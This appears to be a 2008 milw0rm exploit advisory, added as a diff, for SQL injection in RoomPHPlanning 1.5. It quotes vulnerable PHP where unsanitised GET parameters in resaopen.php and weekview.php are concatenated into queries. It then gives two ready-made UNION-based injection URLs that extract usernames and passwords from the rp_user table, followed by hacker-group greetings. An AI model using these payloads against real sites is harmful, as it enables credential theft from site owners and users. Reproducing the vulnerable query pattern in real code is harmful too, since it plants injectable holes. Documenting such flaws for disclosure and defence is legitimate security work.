@@ -1,0 +1,47 @@
+  #######################################################################################
+  #                                                                                     #
+  #           ...::::RoomPHPlanning 1.5 SQL Injection Vulnerabilities ::::...           #          
+  #######################################################################################
+
+Virangar Security Team
+
+www.virangar.net
+www.virangar.ir
+
+--------
+Discoverd By :virangar security team(hadihadi)
+
+special tnx to:MR.nosrati,black.shadowes,MR.hesy,Zahra
+
+& all virangar members & all hackerz
+
+greetz:to my best friend in the world hadi_aryaie2004
+& my lovely friend arash(imm02tal)
+-----
+
+-------vuln codes in:-----------
+resaopen.php:
+line 7:@$idresa = $_GET['idresa'];
+..
+..
+ine 102:$qry = "SELECT IdRm, R.IdUs, TitleRs,".
+   "DateRs, BegRs, EndRs, DescRs,".
+   "BillRs, NameUs ".
+   "FROM ".RESA." R, ".USER." U ".
+   "WHERE IdRs=".$idresa." ".
+   "AND R.IdUs=U.IdUs";
+   
+*********
+weekview.php:
+@$idroom =  $_GET['idroom'];
+....
+line 47:$qry =  "SELECT NameRm, BkcolRm, FtcolRm ".
+  "FROM ".ROOM." WHERE IdRm=".$idroom ;
+---
+exploits:
+http://site.com/resaopen.php?idresa=-99999/**/union/**/select/**/1,2,3,4,5,6,concat(LoginUs,0x3a,char(58),PwdUs),8,9/**/from/**/rp_user/**/where/**/IdRk=1/*
+http://site.com/weekview.php?idroom=-999/**/union/**/select/**/concat(LoginUs,0x3a,char(58),PwdUs),2,3/**/from/**/rp_user/**/where/**/IdRk=1/*
+---
+young iranian h4ck3rz
+
+# milw0rm.com [2008-05-26]
